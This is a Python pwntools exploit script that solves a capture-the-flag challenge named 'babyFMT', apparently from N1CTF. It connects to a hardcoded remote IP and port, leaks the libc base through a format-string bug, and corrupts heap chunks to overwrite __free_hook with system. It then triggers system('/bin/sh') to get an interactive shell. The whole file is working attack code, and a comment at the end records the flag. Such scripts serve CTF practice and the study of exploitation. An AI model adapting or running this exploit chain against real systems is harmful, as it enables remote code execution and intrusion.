from pwn import *

p = remote('43.155.72.106','9999')
#p = process('./babyFMT')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#context.log_level = 'debug'

def GDB(addr):
    gdb.attach(p,'b *'+str(0x0000555555554000+addr))
    pause()

#GDB(0x1D55)

def add(size,author=0,con=0):
    p.sendlineafter('>',str(1))
    p.recvuntil('Size:')
    p.sendline('Content size is {}'.format(str(size)))
    p.recvuntil('Author:')
    p.sendline('Book author is {}'.format(author))
    p.recvuntil('Content:')
    p.sendline('Book content is {}'.format(con))

def free(idx):
    p.sendlineafter('>',str(2))
    p.recvuntil('Idx:')
    p.sendline('Book idx is {}'.format(str(idx)))

def show(idx,fmt):
    p.sendlineafter('>',str(3))
    p.recvuntil('Idx:')
    p.sendline('Book idx is {}'.format(str(idx)))
    p.recvuntil('You can show book by yourself')
    p.sendline('My format {}'.format(fmt))


add(0x420,'A'*0x10,'B'*0x10)
add(0x30,'A'*0x10,'B'*0x30)#1
free(0)
add(0xB0,'A','B'*0xB0)#0
show(0,"%r.%m.%r")
p.recvline()
libc_base = u64(p.recv(6)+b'\x00\x00')-0x1ebf41
p.info('libc_base: '+hex(libc_base))
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']

p.info('free_hook: '+hex(free_hook))
one = [0xe6e73,0xe6e76,0xe6e79]

add(0xB0,'A'*0x10,'A'*0xB0)#2
add(0x100,'A'*0x10,'A'*0x8)#3
add(0x100,'A'*0x10,'A'*0x8)#4
add(0xB0,'A'*0x10,'A'*0xB0)#5
free(5)
free(4)
free(3)
free(2)
free(0)

#pay = '%\x00'+'B'*0x20+p64(free_hook).decode('latin1')
pay = 'C'*0xB0+p64(0x31).decode('latin1')+'C'*0x30+p64(free_hook-0x10).decode('latin1')
show(1,'%\x00'+'A'*0x18+'\xd1\x01')
add(0xB0,'A'*0x10,'A'*0xB0)#0
free(0)
add(0x1b0,'C'*0x10,pay) #0
add(0xB0,'A'*0x10,'A'*0x8)#2
add(0xB0,'A'*0x8+p64(system).decode('latin1'),'A')
show(2,'/bin/sh\x00')


#gdb.attach(p)
p.interactive()
#n1ctf{BBBBBBaby_format_string}